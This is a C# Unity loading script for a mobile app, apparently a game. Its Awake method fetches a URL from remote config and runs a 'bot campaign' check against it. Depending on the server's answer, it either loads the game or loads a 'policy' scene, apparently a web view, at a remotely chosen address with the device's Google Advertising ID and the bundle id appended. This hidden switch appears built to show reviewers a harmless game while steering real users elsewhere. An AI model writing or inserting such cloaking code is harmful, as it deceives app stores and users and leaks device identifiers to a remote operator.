using System.Collections;
using System.Threading.Tasks;
using UnityEngine;
using UnityEngine.Networking;
using Unity.Services.Authentication;
using Unity.Services.Core;
using Unity.Services.RemoteConfig;
using UnityEngine.SceneManagement;
using System;

public class Loading : MonoBehaviour
{
    public static int FinalUrlInt
    {
        get => PlayerPrefs.GetInt("zvers", 0);
        set => PlayerPrefs.SetInt("zvers", value);
    }

    private static int HomeInt
    {
        get => PlayerPrefs.GetInt("zversint", 0);
        set => PlayerPrefs.SetInt("zversint", value);
    }

    public static string HomeString
    {
        get => PlayerPrefs.GetString("zversstr", "konver");
        set => PlayerPrefs.SetString("zversstr", value);
    }

    public struct UserAttributes {}
    public struct AppAttributes { }

    async Task Awake()
    {
        if (!Utilities.CheckForInternetConnection() || HomeInt > 0)
        {
            LoadGame();
            return;
        }

        if (HomeString.Length > 10)
        {
            LoadPolicy();
            return;
        }

        Spinner.Instant();
        await InitializeRemoteConfigAsync();
        await RemoteConfigService.Instance.FetchConfigsAsync(new UserAttributes(), new AppAttributes());
        HomeString = (string)RemoteConfigService.Instance.appConfig.config.First.First;
        if (HomeString.Length < 10)
        {
            LoadGame();
            return;
        }

        StartCoroutine(CheckBotCampaign((ansver) =>
        {
            if (ansver.IsEnd())
            {
                LoadGame();
                return;
            }

            var uri = new Uri(HomeString);
            var oldValue = uri.Segments[uri.Segments.Length - 1];

            HomeString = HomeString.Replace(oldValue, ansver.Company());
            HomeString += $"?{BaseHelper.BundleParam}={Application.identifier}";
            HomeString += $"&{BaseHelper.GAIDParam}={AndroidUtlity.Get_GAID()}";
            HomeString += $"&{BaseHelper.AppSubParam}={BaseHelper.AppSubArg}";

            LoadPolicy();
        }));
    }

    async Task InitializeRemoteConfigAsync()
    {
        await UnityServices.InitializeAsync();
        if (!AuthenticationService.Instance.IsSignedIn)
        {
            await AuthenticationService.Instance.SignInAnonymouslyAsync();
        }
    }

    private void LoadPolicy()
    {
        Screen.orientation = ScreenOrientation.AutoRotation;
        SceneManager.LoadScene("policy");
    }

    public static void LoadGame()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene(1);
    }

    private IEnumerator CheckBotCampaign(Action<string> OnFinishChecking)
    {
        var request = UnityWebRequest.Get(HomeString);
        yield return request.SendWebRequest();

        var ansver = request.downloadHandler.text;
        OnFinishChecking?.Invoke(ansver);
    }
}